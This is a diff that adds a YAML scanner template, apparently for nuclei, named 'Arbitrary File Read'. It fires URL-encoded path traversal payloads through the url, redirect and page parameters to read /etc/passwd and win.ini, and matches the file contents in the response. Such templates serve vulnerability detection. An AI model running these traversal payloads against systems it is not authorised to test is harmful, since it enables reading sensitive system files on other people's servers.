@@ -1,0 +1,27 @@
+id: arbitrary-file-read
+info:
+  author: Sushant Kamble (https://in.linkedin.com/in/sushantkamble)
+  description: Searches for /etc/passwd on passed URLs.
+  name: Arbitrary File Read
+  severity: high
+  tags: fuzz,lfi
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: or
+    part: body
+    regex:
+    - 'root:[x*]:0:0:'
+    - \[(font|extension|file)s\]
+    type: regex
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/?url=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
+  - '{{BaseURL}}/?redirect=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
+  - '{{BaseURL}}/?page=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
+  - '{{BaseURL}}/?redirect=..%2f..%2f..%2f..%2fwindows/win.ini'
+  - '{{BaseURL}}/?page=..%2f..%2f..%2f..%2f..%2fwindows/win.ini'
+  - '{{BaseURL}}/?url=..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini'
